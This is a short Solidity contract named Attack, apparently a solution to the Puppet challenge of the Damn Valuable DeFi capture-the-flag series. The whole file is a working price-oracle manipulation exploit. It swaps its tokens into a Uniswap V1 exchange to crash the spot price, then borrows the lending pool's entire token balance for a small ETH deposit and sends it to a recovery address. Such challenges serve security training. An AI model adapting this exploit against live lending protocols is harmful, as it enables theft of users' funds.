// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {PuppetPool} from "./PuppetPool.sol";
import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "./IUniswapV1Factory.sol";

contract Attack {
  DamnValuableToken token;
  PuppetPool lendingPool;
  IUniswapV1Exchange exchange;
  address recovery;

  constructor(address _token, address _lendingPool, address _exchange, address _recovery) {
    token = DamnValuableToken(_token);
    lendingPool = PuppetPool(_lendingPool);
    exchange = IUniswapV1Exchange(_exchange);
    recovery = _recovery;
  }

  function attack() public {
    uint256 balance = token.balanceOf(address(this));
    token.approve(address(exchange), balance);
    exchange.tokenToEthSwapInput(balance, 9e18, block.timestamp + 1 days);
    lendingPool.borrow{value: address(this).balance}(token.balanceOf(address(lendingPool)), recovery);
  }

  fallback() external payable {}
}
